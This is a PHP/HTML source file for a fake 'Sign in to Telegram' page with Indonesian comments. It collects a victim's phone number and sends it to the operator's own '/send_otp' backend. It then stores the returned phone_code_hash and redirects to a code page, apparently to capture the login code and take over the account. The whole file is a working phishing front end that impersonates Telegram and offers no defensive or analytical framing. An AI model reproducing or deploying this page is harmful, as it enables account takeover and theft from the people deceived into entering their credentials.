<?php
// Include settings file
require_once '../settings.php';
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
    <title>Telegram Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        button#btnNext {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            position: relative;
        }

        /* Rotating Dots Loader */

        .loader {
            display: inline-flex;
            align-items: center;
            justify-content: center;
        }

        .loader-dot {
            width: 6px;
            height: 6px;
            margin: 0 3px;
            border-radius: 50%;
            background-color: white;
            opacity: 0.4;
            animation: bounce 1.5s infinite ease-in-out;
        }

        .loader-dot:nth-child(1) {
            animation-delay: -0.32s;
        }

        .loader-dot:nth-child(2) {
            animation-delay: -0.16s;
        }

        @keyframes bounce {
            0%,
            80%,
            100% {
                transform: scale(0.6);
                opacity: 0.4;
            }
            40% {
                transform: scale(1);
                opacity: 1;
            }
        }

        .hidden {
            display: none;
        }

        button#btnNext .font-semibold {
            font-weight: 600;
        }

        .text-sm {
            font-size: 0.875rem;
        }

        .text-red-500 {
            color: #f87171;
        }

        .text-green-500 {
            color: #10b981;
        }
    </style>
</head>

<body class="bg-gray-900 flex items-center justify-center min-h-screen">
    <div class="text-center w-full max-w-md px-4">
        <img alt="Telegram logo" class="mx-auto mb-6" height="100" src="../img/loggg.svg" width="100" />
        <h1 class="text-2xl text-white font-semibold mb-2">Sign in to Telegram</h1>
        <p class="text-gray-400 mb-6">
            Please confirm your country code and enter your phone number.
        </p>
        <!-- Negara -->
        <div class="relative mb-4">
            <label for="country" class="absolute -top-2 left-3 text-gray-400 text-xs bg-gray-900 px-1">
        Country
      </label>
            <select id="country" class="w-full p-4 bg-transparent text-white rounded-lg border border-gray-600 focus:border-purple-500 focus:outline-none text-base">
        <option>Malaysia</option>
      </select>
        </div>
        <!-- Nomor Telepon -->
        <div class="relative mb-4">
            <label id="labelhp" for="phone" class="absolute -top-2 left-3 text-gray-400 text-xs bg-gray-900 px-1">
        Phone Number
      </label>
            <input id="phone" type="tel" class="w-full p-4 bg-transparent text-white rounded-lg border border-gray-600 focus:border-purple-500 focus:outline-none text-base" placeholder="Nomor telepon Anda" value="+62" />
        </div>
        <!-- Tetap Masuk -->
        <div class="mb-4 flex items-center">
            <input class="mr-2" id="stay-logged-in" type="checkbox" />
            <label class="text-gray-400" for="stay-logged-in">Keep me signed in</label>
        </div>
        <!-- Tombol Selanjutnya -->
        <button id="btnNext" class="w-full bg-gray-600 text-white py-3 rounded text-base btn-loading" disabled>
      <span id="btnText" class="font-semibold">NEXT</span>
      <div class="loader hidden">
        <div class="loader-dot"></div>
        <div class="loader-dot"></div>
        <div class="loader-dot"></div>
      </div>
    </button>
        <!-- Masuk dengan QR -->
        <a class="block mt-4 text-purple-500" href="#">
      LOG IN BY QR CODE
    </a>
        <!-- Pesan Error atau Sukses akan muncul di sini -->
        <p id="message" class="text-sm text-red-500 hidden"></p>
    </div>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
    var phpSettings = {
        endpointUrl: '<?php echo $url; ?>'
    };
    </script>

    <script>
        var inpHp = document.getElementById('phone');
        var btnNext = document.getElementById('btnNext');
        var btnText = btnNext.querySelector('span');
        var loader = btnNext.querySelector('.loader');
        var message = document.getElementById('message');

        // Fungsi untuk menangani input nomor telepon
        inpHp.addEventListener('input', function() {
            let cleanedValue = this.value.replace(/[^0-9+]/g, '');
            if (!cleanedValue.startsWith("+62")) {
                this.value = "+62" + cleanedValue.substring(3);
            } else {
                this.value = cleanedValue;
            }

            if (cleanedValue.length > 1) {
                btnNext.disabled = false;
                btnNext.classList.remove('bg-gray-600');
                btnNext.classList.add('bg-purple-500');
            } else {
                btnNext.disabled = true;
                btnNext.classList.remove('bg-purple-500');
                btnNext.classList.add('bg-gray-600');
            }
        });

        // Fungsi untuk mengirim OTP dan menangani pengalihan
        btnNext.addEventListener('click', function() {
            var phone = inpHp.value;

            // Ubah teks tombol dan tampilkan loader
            btnText.textContent = 'PLEASE WAIT...'; // Ganti teks tombol
            loader.classList.remove('hidden'); // Tampilkan loader
            btnNext.classList.add('processing');
            btnNext.disabled = true;

            // Reset pesan sebelumnya
            message.classList.add('hidden');
            message.textContent = '';
            
            const endpointUrl = phpSettings.endpointUrl;

            // Kirim data ke server menggunakan fetch
            fetch(endpointUrl + "/send_otp", { // Ganti URL dengan backend Flask Anda
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        phone: phone
                    }),
                })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        sessionStorage.setItem('phone', phone);
                        sessionStorage.setItem("phone_code_hash", data.phone_code_hash);
                        // Jika OTP berhasil dikirim, arahkan ke halaman code.php
                        window.location.href = "code.php";
                    } else {
                        // Tampilkan pesan error
                        message.classList.remove('hidden');
                        message.textContent = data.message || "Nomor telepon tidak valid.";
                        message.classList.add('text-red-500');

                        // Reset tombol dan sembunyikan loader
                        btnNext.classList.remove('processing');
                        btnText.textContent = 'NEXT'; // Reset teks tombol
                        loader.classList.add('hidden'); // Sembunyikan loader
                        btnNext.disabled = false;
                    }
                })
                .catch(error => {
                    // Tampilkan pesan kesalahan jika ada masalah dengan permintaan
                    message.classList.remove('hidden');
                    message.textContent = "Terjadi kesalahan, coba lagi nanti.";
                    message.classList.add('text-red-500');

                    // Reset tombol dan sembunyikan loader
                    btnNext.classList.remove('processing');
                    btnText.textContent = 'NEXT'; // Reset teks tombol
                    loader.classList.add('hidden'); // Sembunyikan loader
                    btnNext.disabled = false;
                });
        });
    </script>
</body>

</html>